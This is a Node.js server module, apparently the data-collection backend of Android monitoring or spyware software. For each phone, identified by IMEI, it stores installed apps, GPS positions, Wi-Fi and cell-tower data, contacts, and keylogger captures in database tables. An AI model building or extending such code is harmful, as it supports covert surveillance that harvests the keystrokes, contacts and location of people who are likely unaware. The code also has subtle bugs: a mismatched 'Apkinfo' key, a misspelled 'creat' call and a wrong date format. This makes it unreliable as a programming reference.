'use strict'
let Sequelize = require('sequelize');
let moment = require('moment');
// 設定DB
let applist = require('../db/models/applist');
let gps = require('../db/models/gps');
let wifistate = require('../db/models/wifistate');
let contacts = require('../db/models/contacts');
let connectedCellInfo = require('../db/models/conntedCellinfo');
let nearbyCellInfo = require('../db/models/nearbyCellInfo');
let keyLog = require('../db/models/keylog');
// 設定log
let log4js = require('../logger/log4js');

let {logger} = log4js;

let warn = logger('warn');
let error = logger('error');

module.exports = {
    maintainMonitorData: function(req, res, rootObj){
        //logger parameter rootObj
        warn.warn('maintainMonitorData');
        warn.warn(rootObj);

        if(rootObj.ApkInfo!=null){
            targetApkInfo(rootObj.IMEI, rootObj.Apkinfo);
        }

        if(rootObj.GPS!=null){
            targetGpsInfo(rootObj.IMEI,rootObj.GPS);
        }

        if(rootObj.WiFi!=null){
            targetWifiInfo(rootObj.IMEI,rootObj.WiFi);
        }

        if(rootObj.Contacts!=null){
            targetContactInfo(rootObj.IMEI,rootObj.Contacts);
        }

        if(rootObj.CellInfo!=null){
            targetCellInfo(rootObj.IMEI,rootObj.CellInfo);
        }

        if(rootObj.nearbyCell!=null){
            targetNearbyCellInfo(rootObj.IMEI,rootObj.nearbyCell);
        }

        if(rootObj.keylogger!=null){
            targetKeyLogger(rootObj.IMEI,rootObj.keylogger);
        }        
    }
}
/**
 * 把多筆資料更新到 table applist
 * 
 * @param {any} IMEI 
 * @param {any} Apkinfos 
 */
function targetApkInfo(IMEI, Apkinfos){   
    warn.warn(`IMEI: ${IMEI}`);
    warn.warn(Apkinfos);
    Apkinfos.forEach((Apkinfo)=>{
        applist.findAll({where:{IMEI:IMEI,PackageName:Apkinfo.Package},raw:true})
        .then((result)=>{
            if(result.length==0){// insert 
                doUpsertApkInfo(IMEI,Apkinfo,false);
            }
            else{// update
                doUpsertApkInfo(IMEI,Apkinfo,true);
            }
        })
        .catch((err)=>{
            error.error(err);
        });
    });
}
/**
 * 把資料更新到 table applist
 * 
 * @param {any} IMEI 
 * @param {any} Apkinfo 
 * @param {any} isUpdate 
 */
function doUpsertApkInfo(IMEI, Apkinfo, isUpdate){
    let Time = moment().format('yyyy/MM/dd HH:mm:ss');
    let PackageName = Apkinfo.Package;
    let AppName = Apkinfo.App;    
    if(isUpdate==true){
        applist.update({IsInstalled:true},{where:{IMEI:IMEI,PackageName:PackageName}})
        .then((re)=>{     
            warn.warn(`success update applist set IsInstalled=true where IMEI=${IMEI} And PackageName=${PackageName}`);
        })
        .catch((err)=>{
            error.error(err);
        });
    }
    else{
        applist.create({
            IMEI:IMEI,
            AppName:AppName,
            Time:Time,
            PackageName:PackageName,
            IsInstalled:true
        })
        .then((re)=>{
            warn.warn(`start insert into applist (IMEI, AppName, PackageName, Time, IsInstalled) values(${IMEI},${AppName},${Time},${PackageName},true)`);
        })
        .catch((err)=>{
            error.error(err);
        });
    }
}
/**
 * 把多筆資料放到 table GPS
 * 
 * @param {any} IMEI 
 * @param {any} GPSes 
 */
function targetGpsInfo(IMEI,GPSes){
    warn.warn(`IMEI:${IMEI}`);
    warn.warn(GPSes);
    GPSes.forEach((GPS)=>{
        doInsertGPS(IMEI,GPS);
    });
}
/**
 * 把資料放到 table GPS
 * 
 * @param {any} IMEI 
 * @param {any} GPS 
 */
function doInsertGPS(IMEI, GPS){
     let Time = moment().format('yyyy/MM/dd HH:mm:ss');
     let {latitude,longitude} = GPS;   
     warn.warn(`start insert into gps (IMEI, latitude, longitude,Time) values (${IMEI},${latitude},${longitude},${Time})`);
     gps.creat({
         IMEI:IMEI,
         latitude:latitude,
         longitude:longitude,
         Time:Time
     })
     .then((re)=>{       
        warn.warn(`success insert into gps (IMEI, latitude, longitude,Time) values (${IMEI},${latitude},${longitude},${Time})`);
     })
     .catch((err)=>{
         error.error(err);        
     });
}
/**
 * 把多筆資料放到 table wifi
 * 
 * @param {any} IMEI 
 * @param {any} WiFis 
 */
function targetWifiInfo(IMEI,WiFis){   
    warn.warn(`IMEI:${IMEI}`);
    warn.warn(WiFis);
    WiFis.forEach((WiFi)=>{
        doInsertWifi(IMEI,WiFi);
    });
}
/**
 * 把資料輸入至 table wifi
 * 
 * @param {any} IMEI 
 * @param {any} WiFi 
 */
function doInsertWifi(IMEI,WiFi){
     let Time = moment().format('yyyy/MM/dd HH:mm:ss');
     let {SSID, LinkSpeed, Mac ,IPAddress} = WiFi;   
     warn.warn(`start insert into wifistate (IMEI, SSID, LinkSpeed, MAC_Address, IP_Address,Time) values (${IMEI},${SSID},${LinkSpeed},${Mac},${IPAddress},${Time})`);
     wifistate.create({
        IMEI:IMEI,
        SSID:SSID,
        LinkSpeed:LinkSpeed,
        MAC_Address:Mac,
        IP_Address:IPAddress,
        Time: Time
     })
     .then((re)=>{       
        warn.warn(`success insert into wifistate (IMEI, SSID, LinkSpeed, MAC_Address, IP_Address,Time) values (${IMEI},${SSID},${LinkSpeed},${Mac},${IPAddress},${Time})`);
     })
     .catch((err)=>{
         error.error(err);       
     })
}
/**
 * 把多筆資料更新到 table contact
 * 
 * @param {any} IMEI 
 * @param {any} Contacts 
 */
function targetContactInfo(IMEI, Contacts){
   
    warn.warn(`IMEI:${IMEI}`);
   
    warn.warn(Contacts);
    Contacts.forEach((Contact)=>{
        if(Contact.Name.length!=0 && Contact.PhoneNo.length!=0){
            contacts.findAll({where:{IMEI:IMEI,Phone_No:Contact.PhoneNo}})
            .then((result)=>{
                if(result.length > 0 ){
                    doUpsertContacts(IMEI,Contact,true);
                }
                else{
                    doUpsertContacts(IMEI,Contact,false);
                }
            })
            .catch((err)=>{                
                error.error(err);
            });
        }
    });
}
/**
 * 把資料更新到 table contact
 * 
 * @param {any} IMEI 
 * @param {any} Contact 
 * @param {any} isUpdate 
 */
function doUpsertContacts(IMEI, Contact,isUpdate){
    let Time = moment().format('yyyy/MM/dd HH:mm:ss');
    let {Name, PhoneNo} = Contact;    
    warn.warn(isUpdate==true?`start update contacts set exist=true where IMEI=${IMEI} And Name=${Name} And Phone_No=${PhoneNo}`:`start insert into contacts (IMEI,Name,Phone_No,exist,Time) values(${IMEI},${Name},${PhoneNo},true,${Time})`);
    if(isUpdate==true){
        contacts.update({exist:true},{where:{
            IMEI:IMEI,
            Name:Name,
            Phone_No:PhoneNo
        }})
        .then((re)=>{       
           warn.warn(`success update contacts set exist=true where IMEI=${IMEI} And Name=${Name} And Phone_No=${PhoneNo}`);
        })
        .catch((err)=>{            
            error.error(err);
        });
    }
    else{
        contacts.create({
            IMEI:IMEI,
            Name:Name,
            Phone_No:PhoneNo,
            exist:true,
            Time:Time
        })
        .then((re)=>{           
            warn.warn(`start insert into contacts (IMEI,Name,Phone_No,exist,Time) values(${IMEI},${Name},${PhoneNo},true,${Time})`);
        })
        .catch((err)=>{
            error.error(err);
            
        })
    }
}
/**
 * 把多筆資料更新到 table cells
 * 
 * @param {any} IMEI 
 * @param {any} CellInfos 
 */
function targetCellInfo(IMEI,CellInfos){    
    warn.warn(`IMEI:${IMEI}`);
    warn.warn(CellInfos);
    CellInfos.forEach((CellInfo)=>{
        doInsertCellInfo(IMEI,CellInfo);
    });
}
/**
 * 輸入資料到 table cellinfo 
 * 
 * @param {any} IMEI 
 * @param {any} CellInfo 
 */
function doInsertCellInfo(IMEI,CellInfo){
    let Time = Sequelize.NOW;
    let {networktype,signalstrength,lac, cid, enb, eci} = CellInfo; 
    warn.warn(`start insert into conntedCellInfo (IMEI,network_type, signal_strength, lastupdateTime,LAC,Cell_id,eNB_id, ECI) 
                     values (${IMEI},${networktype},${signalstrength},${Time},${lac},${cid},${enb},${eci})`);
    connectedCellInfo.create({
        IMEI:IMEI,
        network_type:networktype,
        signal_strength:signalstrength,
        lastupdateTime:Time,
        LAC:lac,
        Cell_id:cid,
        eNB_id: enb,
        ECI:eci
    })
    .then((re)=>{       
        warn.warn(`success insert into conntedCellInfo (IMEI,network_type, signal_strength, lastupdateTime,LAC,Cell_id,eNB_id, ECI) 
                     values (${IMEI},${networktype},${signalstrength},${Time},${lac},${cid},${enb},${eci})`);
    })
    .catch((err)=>{
        error.error(err);        
    });
}
/**
 * 把多筆資料放入 table nearbyCell
 * 
 * @param {any} IMEI 
 * @param {any} NearbyCells 
 */
function targetNearbyCellInfo(IMEI,NearbyCells){  
    warn.warn(`IMEI:${IMEI}`);   
    warn.warn(NearbyCells);
    NearbyCells.forEach((NearbyCell)=>{
        doInsertNearbyCell(IMEI, NearbyCell);
    });
}
/**
 * 把資料放入 table nearbyCell
 * 
 * @param {any} IMEI 
 * @param {any} NearbyCell 
 */
function doInsertNearbyCell(IMEI, NearbyCell){
   let Time = Sequelize.NOW;
   let {networktype,signalstrength,lac, cid, enb, eci} = NearbyCell; 
    warn.warn(`start insert into nearbyCellInfo (IMEI,network_type, signal_strength, lastupdateTime,LAC,Cell_id,eNB_id, ECI) 
                     values (${IMEI},${networktype},${signalstrength},${Time},${lac},${cid},${enb},${eci})`);
    nearbyCellInfo.create({
        IMEI:IMEI,
        network_type:networktype,
        signal_strength:signalstrength,
        lastupdateTime:Time,
        LAC:lac,
        Cell_id:cid,
        eNB_id: enb,
        ECI:eci
    })
    .then((re)=>{    
        warn.warn(`success insert into nearbyCellInfo (IMEI,network_type, signal_strength, lastupdateTime,LAC,Cell_id,eNB_id, ECI) 
                     values (${IMEI},${networktype},${signalstrength},${Time},${lac},${cid},${enb},${eci})`);
    })
    .catch((err)=>{
        
        error.error(err);
    })
}
/**
 * 把多筆資料放到 table keylog
 * 
 * @param {any} IMEI 
 * @param {any} keyloggers 
 */
function targetKeyLogger(IMEI,keyloggers){    
    warn.warn(`IMEI:${IMEI}`);
    warn.warn(keyloggers);
    keyloggers.forEach((keylogger)=>{
        doInsertKeyLog(IMEI,keylogger);
    });
}
/**
 * 把資料放到 table keylog
 * 
 * @param {any} IMEI 
 * @param {any} keylogger 
 */
function doInsertKeyLog(IMEI,keylogger){
    let {timestamp,keylog} = keylogger;
    timestamp = moment(timestamp);    
    warn.warn(`start insert into keylog (imei,keylog,timestamp) values(${IMEI},${keylog},${timestamp})`);
    keyLog.create({
        imei:IMEI,
        keylog:keylog,
        timestamp:timestamp
    })
    .then((re)=>{       
        warn.warn(`success insert into keylog (imei,keylog,timestamp) values(${IMEI},${keylog},${timestamp})`);  
    })
    .catch((err)=>{
        error.error(err);        
    })
}